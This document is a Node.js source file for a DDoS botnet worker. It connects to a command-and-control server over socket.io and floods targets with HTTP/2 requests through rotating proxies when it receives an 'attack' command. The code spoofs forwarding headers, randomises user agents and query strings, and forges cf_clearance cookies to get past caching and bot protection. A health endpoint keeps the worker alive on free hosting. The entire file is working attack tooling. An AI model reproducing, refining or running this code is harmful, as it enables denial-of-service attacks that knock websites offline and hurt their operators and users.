process.on('uncaughtException', (err) => {
    console.error('[!] Uncaught Exception:', err.message);
});
process.on('unhandledRejection', (err) => {
    console.error('[!] Unhandled Rejection:', err.message);
});

const io = require('socket.io-client');
const cluster = require('cluster');
const crypto = require('crypto');
const http2 = require('http2');
const net = require('net');
const tls = require('tls');
const url = require('url');
const fs = require('fs');
const os = require('os');
const express = require('express');
const { Worker } = require('worker_threads');

// ==================== CONFIG ====================
const MASTER_DOMAIN = process.argv[2];
const HEALTH_PORT = process.env.PORT || 10000;

if (!MASTER_DOMAIN) {
    console.error('[!] Usage: node worker.js <master_domain>');
    console.error('[!] Example: node worker.js control-13.onrender.com');
    process.exit(1);
}

// ==================== LẤY IP THẬT ====================
function getLocalIP() {
    try {
        const nets = os.networkInterfaces();
        for (const name of Object.keys(nets)) {
            for (const net of nets[name]) {
                if (net.family === 'IPv4' && !net.internal) {
                    return net.address;
                }
            }
        }
    } catch (e) {}
    return 'unknown';
}

// ==================== TẢI PROXY ====================
let proxies = [];
try {
    if (fs.existsSync('./proxy.txt')) {
        proxies = fs.readFileSync('./proxy.txt', 'utf-8')
            .split('\n')
            .map(line => line.trim())
            .filter(line => line && line.includes(':'));
        console.log(`[+] Loaded ${proxies.length} proxies from file`);
    }
    
    // Nếu không có proxy, tạo proxy giả
    if (proxies.length === 0) {
        console.log('[!] No proxies found, using direct connection');
        proxies = ['direct'];
    }
} catch (e) {
    console.log('[!] Error loading proxies');
    proxies = ['direct'];
}

// ==================== HEALTH SERVER ====================
const healthApp = express();

healthApp.get('/', (req, res) => {
    res.send(`
        <html>
        <head><title>🤖 WORKER</title></head>
        <body>
            <h1>🤖 WORKER ACTIVE</h1>
            <p>IP: ${getLocalIP()}</p>
            <p>Master: ${MASTER_DOMAIN}</p>
            <p>Connection: ${socket && socket.connected ? '✅ CONNECTED' : '❌ DISCONNECTED'}</p>
            <p>Proxies: ${proxies.length}</p>
            <p>Uptime: ${Math.floor(process.uptime())}s</p>
        </body>
        </html>
    `);
});

healthApp.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        ip: getLocalIP(),
        connected: socket ? socket.connected : false,
        proxies: proxies.length,
        uptime: process.uptime()
    });
});

healthApp.listen(HEALTH_PORT, '0.0.0.0', () => {
    console.log(`[+] Health server running on port ${HEALTH_PORT}`);
});

// ==================== TLS CONFIG ====================
const ciphers = [
    'TLS_AES_128_GCM_SHA256',
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256'
].join(':');

const secureContext = tls.createSecureContext({
    ciphers: ciphers,
    honorCipherOrder: true,
    minVersion: 'TLSv1.2'
});

// ==================== RANDOM HELPERS ====================
function randomElement(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function randomString(len) { return crypto.randomBytes(len).toString('hex').slice(0, len); }
function randomIP() { return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`; }
function randomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }

// ==================== USER-AGENTS ====================
const uap = [
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/149.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 20_0 like Mac OS X) AppleWebKit/605.1.15 Version/20.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 Chrome/150.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/120.0.0.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/121.0.0.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 OPR/105.0.0.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/122.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/123.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 Version/17.3 Safari/605.1.15',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36',

'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/122.0',
'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
'Mozilla/5.0 (X11; Fedora; Linux x86_64) Gecko/20100101 Firefox/123.0',
'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 Chrome/122.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Redmi Note 12) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; OnePlus 11) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Vivo V29) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Samsung Galaxy A54) AppleWebKit/537.36 Chrome/122.0.0.0 Mobile Safari/537.36',

'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 Version/17.3 Mobile Safari/604.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Version/17.4 Mobile Safari/604.1',
'Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 Version/17.3 Mobile Safari/604.1',
'Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Version/17.4 Mobile Safari/604.1',
'Mozilla/5.0 (Linux; Android 14; Huawei P60) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Xiaomi 14 Pro) AppleWebKit/537.36 Chrome/122.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Realme GT5) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Oppo Reno10) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Poco F5) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Sony Xperia 1 V) AppleWebKit/537.36 Chrome/122.0.0.0 Mobile Safari/537.36',

'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/149.0.0.0 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 20_0 like Mac OS X) AppleWebKit/605.1.15 Version/20.0 Mobile Safari/604.1',
'Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 Chrome/150.0.0.0 Mobile Safari/537.36',

'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; WOW64) Gecko/20100101 Firefox/119.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) Gecko/20100101 Firefox/120.0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 OPR/104.0.0.0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Edg/120.0.0.0',
'Mozilla/5.0 (Linux; Android 12; Galaxy S22) AppleWebKit/537.36 Chrome/118.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Pixel Fold) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Nokia G60) AppleWebKit/537.36 Chrome/118.0.0.0 Mobile Safari/537.36',

'Mozilla/5.0 (Linux; Android 13; Asus ROG Phone 7) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Lenovo Legion Y90) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Black Shark 5) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; ZTE Nubia Z50) AppleWebKit/537.36 Chrome/118.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Meizu 20) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Honor Magic6) AppleWebKit/537.36 Chrome/122.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; LG Velvet) AppleWebKit/537.36 Chrome/118.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Motorola Edge 40) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Nothing Phone 2) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; HTC U20) AppleWebKit/537.36 Chrome/118.0.0.0 Mobile Safari/537.36',

'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Brave/1.62 Chrome/120.0.0.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 Brave/1.63 Chrome/121.0.0.0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Brave/1.64 Chrome/122.0.0.0',
'Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 Brave/1.60 Chrome/120.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Galaxy S23) AppleWebKit/537.36 Brave/1.61 Chrome/121.0.0.0 Mobile Safari/537.36',

'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Vivaldi/6.5 Chrome/120.0.0.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 Vivaldi/6.6 Chrome/121.0.0.0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Vivaldi/6.7 Chrome/122.0.0.0',

'Mozilla/5.0 (Linux; Android 13; Samsung Browser 22.0) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Samsung Browser 23.0) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Samsung Browser 21.0) AppleWebKit/537.36 Chrome/118.0.0.0 Mobile Safari/537.36',

'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 Version/16.7 Mobile Safari/604.1',
'Mozilla/5.0 (iPad; CPU OS 16_7 like Mac OS X) AppleWebKit/605.1.15 Version/16.7 Mobile Safari/604.1',

'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36',

'Mozilla/5.0 (Linux; Android 11; Redmi Note 10) AppleWebKit/537.36 Chrome/115.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; Oppo A78) AppleWebKit/537.36 Chrome/115.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Vivo Y20) AppleWebKit/537.36 Chrome/114.0.0.0 Mobile Safari/537.36',

'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 Chrome/109.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; Win64; x64) Gecko/20100101 Firefox/115.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/15.6 Safari/605.1.15',

'Mozilla/5.0 (Linux; Android 9; Mi 9T) AppleWebKit/537.36 Chrome/108.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; Galaxy S10) AppleWebKit/537.36 Chrome/108.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1; Nokia 7 Plus) AppleWebKit/537.36 Chrome/106.0.0.0 Mobile Safari/537.36'
];

// ==================== CLASS NetSocket ====================
class NetSocket {
    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        
        const connection = net.connect(options.port, options.host, () => {
            connection.write(buffer);
        });

        connection.setTimeout(5000);
        connection.setKeepAlive(true, 30000);
        connection.setNoDelay(true);

        connection.on('data', (chunk) => {
            const response = chunk.toString();
            if (response.includes('HTTP/1.1 200')) {
                callback(connection);
            } else {
                connection.destroy();
                callback(null);
            }
        });

        connection.on('timeout', () => {
            connection.destroy();
            callback(null);
        });

        connection.on('error', () => {
            connection.destroy();
            callback(null);
        });
    }
}

// ==================== ATTACK ENGINE ====================
class AttackEngine {
    constructor(target, rate) {
        this.target = target;
        this.rate = rate;
        this.parsed = url.parse(target);
        this.running = true;
        this.requestCount = 0;
        this.socker = new NetSocket();
    }

    async start() {
        console.log(`[+] Attack engine started for ${this.target} with rate ${this.rate}`);
        
        // Gửi stats mỗi giây
        this.statsInterval = setInterval(() => {
            if (this.requestCount > 0 && socket.connected) {
                socket.emit('stats', { count: this.requestCount });
                this.requestCount = 0;
            }
        }, 1000);

        // Chạy nhiều luồng song song
        const threads = [];
        for (let i = 0; i < 10; i++) {
            threads.push(this.runThread());
        }
        
        await Promise.all(threads);
    }

    async runThread() {
        while (this.running) {
            try {
                await this.sendRequest();
            } catch (e) {}
        }
    }

    async sendRequest() {
        const proxy = randomElement(proxies);
        if (proxy === 'direct') return;

        const [proxyHost, proxyPort] = proxy.split(':');
        if (!proxyHost || !proxyPort) return;

        const path = this.parsed.path + (this.parsed.path.includes('?') ? '&' : '?') + 
                     randomString(randomInt(4, 8)) + '=' + randomString(randomInt(2, 5));

        const headers = {
            ':method': 'GET',
            ':path': path,
            ':authority': this.parsed.host,
            'user-agent': randomElement(uap),
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'x-forwarded-for': randomIP(),
            'x-real-ip': randomIP(),
            'cookie': `cf_clearance=${randomString(40)}; session=${randomString(16)}`
        };

        return new Promise((resolve) => {
            this.socker.HTTP({
                host: proxyHost,
                port: parseInt(proxyPort),
                address: this.parsed.host + ':443'
            }, (connection) => {
                if (!connection || !this.running) {
                    resolve();
                    return;
                }

                const tlsConn = tls.connect({
                    socket: connection,
                    ALPNProtocols: ['h2', 'http/1.1'],
                    servername: this.parsed.host,
                    rejectUnauthorized: false,
                    secureContext: secureContext
                });

                const client = http2.connect(this.parsed.href, {
                    createConnection: () => tlsConn
                });

                client.on('connect', () => {
                    // Gửi nhiều request theo rate
                    for (let i = 0; i < this.rate; i++) {
                        try {
                            const req = client.request(headers);
                            req.on('error', () => {});
                            req.end();
                            this.requestCount++;
                        } catch (e) {}
                    }
                    
                    setTimeout(() => {
                        try { client.close(); } catch (e) {}
                        try { connection.destroy(); } catch (e) {}
                        resolve();
                    }, 100);
                });

                client.on('error', () => {
                    try { client.destroy(); } catch (e) {}
                    try { connection.destroy(); } catch (e) {}
                    resolve();
                });

                // Timeout
                setTimeout(() => {
                    try { client.destroy(); } catch (e) {}
                    try { connection.destroy(); } catch (e) {}
                    resolve();
                }, 5000);
            });
        });
    }

    stop() {
        console.log('[+] Stopping attack engine');
        this.running = false;
        clearInterval(this.statsInterval);
    }
}

// ==================== KẾT NỐI TỚI MASTER ====================
const masterUrl = `https://${MASTER_DOMAIN}`;
console.log(`[+] Connecting to master at ${masterUrl}`);

const socket = io(masterUrl, {
    reconnection: true,
    reconnectionAttempts: Infinity,
    reconnectionDelay: 1000,
    timeout: 20000,
    transports: ['websocket', 'polling']
});

let currentAttack = null;

socket.on('connect', () => {
    console.log(`[+] Connected to master at ${MASTER_DOMAIN}:443`);
    socket.emit('register', { ip: getLocalIP() });
});

socket.on('registered', (data) => {
    console.log(`[+] Registered with master. Total workers: ${data.workers}`);
});

socket.on('ping', () => {
    socket.emit('pong');
});

socket.on('attack', async (data) => {
    console.log(`\n[+] ATTACK COMMAND RECEIVED`);
    console.log(`   Target: ${data.target}`);
    console.log(`   Time: ${data.time}s`);
    console.log(`   Rate: ${data.rate}`);
    console.log(`   Threads: ${data.threads}`);
    
    // Dừng attack cũ nếu có
    if (currentAttack) {
        currentAttack.stop();
    }

    // Tạo attack engine mới
    const engine = new AttackEngine(data.target, data.rate);
    currentAttack = engine;

    // Chạy attack
    engine.start();

    // Tự động dừng sau thời gian
    setTimeout(() => {
        if (currentAttack === engine) {
            console.log(`[+] Attack time finished`);
            engine.stop();
            currentAttack = null;
            process.exit(0); // Render sẽ restart worker
        }
    }, data.time * 1000);
});

socket.on('stop', () => {
    console.log(`[+] STOP command received`);
    if (currentAttack) {
        currentAttack.stop();
        currentAttack = null;
    }
    process.exit(0);
});

socket.on('disconnect', (reason) => {
    console.log(`[-] Disconnected from master: ${reason}`);
    setTimeout(() => process.exit(0), 5000);
});
